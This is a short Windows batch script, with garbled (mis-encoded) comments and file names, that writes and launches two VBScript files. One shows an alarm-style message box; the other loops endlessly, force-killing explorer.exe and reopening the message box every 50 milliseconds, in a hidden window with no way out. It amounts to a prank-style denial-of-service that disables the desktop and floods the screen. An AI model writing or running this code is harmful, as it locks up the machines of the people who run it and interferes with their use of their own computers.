:: �w�w�]��ANSI�s�X
@echo off
echo MsgBox "�A���q�����r�F",16 >���r1.vbs
echo do >���r2.vbs
echo CreateObject("WScript.Shell").Run "cmd /c taskkill /f /IM explorer.exe",vbhide  >>���r2.vbs
echo CreateObject("WScript.Shell").Run("%cd%\���r1.vbs") >>���r2.vbs
echo WScript.Sleep 50 >>���r2.vbs
echo loop >>���r2.vbs
start %cd%\���r2.vbs